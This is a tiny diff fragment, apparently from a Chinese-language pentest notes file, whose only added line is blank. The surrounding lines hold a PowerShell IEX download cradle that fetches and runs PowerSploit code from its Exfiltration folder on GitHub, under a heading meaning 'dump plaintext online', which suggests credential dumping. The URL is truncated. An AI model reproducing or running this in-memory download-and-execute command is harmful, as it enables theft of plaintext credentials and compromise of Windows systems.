@@ -6,3 +6,4 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser
 在线导明文
 
 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration
+
